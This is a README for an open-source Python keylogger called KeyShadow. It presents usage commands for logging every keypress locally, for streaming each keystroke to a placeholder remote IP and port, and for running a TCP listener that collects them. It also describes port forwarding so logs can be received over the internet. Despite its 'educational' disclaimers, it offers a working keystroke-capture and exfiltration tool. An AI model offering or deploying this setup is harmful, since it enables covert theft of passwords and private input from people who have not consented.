# KeyShadow

**An Educational, Open-Source, Cross-Platform Keylogger**

```
 _  __           _____ _           _               
| |/ /___ _   _ /  ___| |__   __ _| |_ ___  _ __   
| ' // _ \ | | |\___ \| '_ \ / _` | __/ _ \| '__|  
| . \  __/ |_| | ___) | | | | (_| | || (_) | |     
|_|\_\___|\__, | |____/|_| |_|\__,_|\__\___/|_|     
         |___/                                  
```

## ⚠️ WARNING

> **KeyShadow is for EDUCATIONAL and ETHICAL use only.**
>
> - Use ONLY on your own device, or with clear written PERMISSION.
> - Unauthorized use is likely ILLEGAL and UNETHICAL.
> - Authors and contributors assume NO responsibility for misuse.

---

## Features

- **Local logging** to file (`local` mode)
- **Network sending** to another device (`send` mode)
- **Network receiving** logs (`receive` mode)
- **Customizable**: IPs, ports, log file path via CLI
- **Works on**: Kali Linux, Ubuntu, other Linux distros; limited support on Termux
- **Python 3.7+ required**
- **No API keys or cloud dependencies**
- **Simple, plain-text log files**
- **Open source (MIT License)**

---

## Installation

1. **Install Python 3.7+**
2. **Install dependencies:**
    ```bash
    pip install pynput
    ```
3. **Download `keyshadow.py` to your system**

---

## Usage

### **Help Menu**
```bash
python3 keyshadow.py --help
```

### **Modes**

#### 1. Local Logging (Log to File)

```bash
python3 keyshadow.py --mode local --logfile mylogs.txt
```
- Logs all keypresses to `mylogs.txt`.
- Press `ESC` to stop logging.

#### 2. Send Mode (Send Logs to Remote Device)

```bash
python3 keyshadow.py --mode send --remote-ip <RECEIVER_IP> --remote-port 8080
```
- Sends every keystroke to a receiver at `<RECEIVER_IP>:8080` AND saves locally.
- You must have a receiver running (see below).

#### 3. Receive Mode (Listen for Logs)

```bash
python3 keyshadow.py --mode receive --listen-port 8080 --logfile received.txt
```
- Listens for logs on port 8080 and writes them to `received.txt`.
- Shows log lines as they arrive.

---

## Example: Logging Across the Network

**PC 1 (Receiver):**
```bash
python3 keyshadow.py --mode receive --listen-port 8080 --logfile logs_from_laptop.txt
```

**PC 2 (Sender):**
```bash
python3 keyshadow.py --mode send --remote-ip <PC1_IP> --remote-port 8080
```

- Both devices must be on the same local network.
- Use your PC's local IP (e.g., `192.168.1.5`) for `<PC1_IP>`.

---

## Remote Logging (Outside Local Network)

- **Port Forwarding:**  
  Open (forward) port 8080 on your router to the receiver's local IP.
- **Firewall:**  
  Allow inbound connections on port 8080.
- **Security:**  
  Be aware this exposes your device to the internet—only use on trusted networks, and for educational testing.
- **Never** use on devices/networks without explicit, legal permission.

---

## OS Compatibility

| OS / Platform | Supported? | Notes                                                |
|---------------|------------|------------------------------------------------------|
| Kali Linux    | ✅         | Full support                                         |
| Ubuntu        | ✅         | Full support                                         |
| Other Linux   | ✅         | Full support                                         |
| Termux        | ⚠️        | Only within Termux shell (no global key capture)     |
| Windows/macOS | ❌        | Not tested; may require additional tweaks            |

---

## How It Works

- **local**: Records every keypress to a local file.
- **send**: Sends each keypress to a given IP:port, as well as logging locally.
- **receive**: Starts a simple TCP server to receive log entries and write them to a file.

---

## Limitations

- **No encryption** of logs or network data (for educational simplicity)
- **No cloud or email integration**
- **Key capture limited to session/scope allowed by OS**
- **Not intended for stealth or malicious use**
- **Not tested on Windows/macOS**

---

## Authors


- **Lokesh Kumar**


---

## License

[MIT License](LICENSE)

---

## Contributing

PRs and suggestions welcome for further educational features.

---

## Disclaimer

This software is provided “as is” for ethical and educational use.  
**You are responsible for your actions.**
